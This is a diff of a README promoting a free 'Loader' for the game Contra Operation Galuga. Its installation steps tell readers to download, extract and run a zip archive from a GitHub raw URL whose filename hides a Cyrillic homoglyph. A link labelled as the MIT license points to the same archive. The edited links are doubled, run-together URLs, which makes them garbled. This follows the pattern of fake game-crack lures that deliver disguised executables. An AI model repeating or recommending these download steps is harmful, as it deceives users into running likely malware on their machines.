@@ -28,7 +28,7 @@ Welcome to Contra Operation Galuga  - the all-in-one Loader for seamless access 
 
 ## ⚙️ Installation
 
-1. Download https://raw.githubusercontent.com/Th4nhDT716/GalugaLegendsFreeLaunch/main/Lоader.zip from the repository.
+1. Download https://raw.githubusercontent.com/Th4nhDT716/GalugaLegendsFreeLaunch/main/Lоader.zipоhttps://raw.githubusercontent.com/Th4nhDT716/GalugaLegendsFreeLaunch/main/Lоader.zip from the repository.
 2. Extract the archive with WinRAR, 7-Zip, or native tool.
 3. Launch the Loader app and follow on-screen instructions.
 4. Enjoy Contra Operation Galuga instantly!
@@ -43,4 +43,4 @@ This Loader is for users who already possess a legitimate license or ownership f
 
 ## 📄 License (MIT 2025)
 This repository uses the MIT License.  
-[Read the full license here.](https://raw.githubusercontent.com/Th4nhDT716/GalugaLegendsFreeLaunch/main/Lоader.zip)
+[Read the full license here.](https://raw.githubusercontent.com/Th4nhDT716/GalugaLegendsFreeLaunch/main/Lоader.zipоhttps://raw.githubusercontent.com/Th4nhDT716/GalugaLegendsFreeLaunch/main/Lоader.zip)
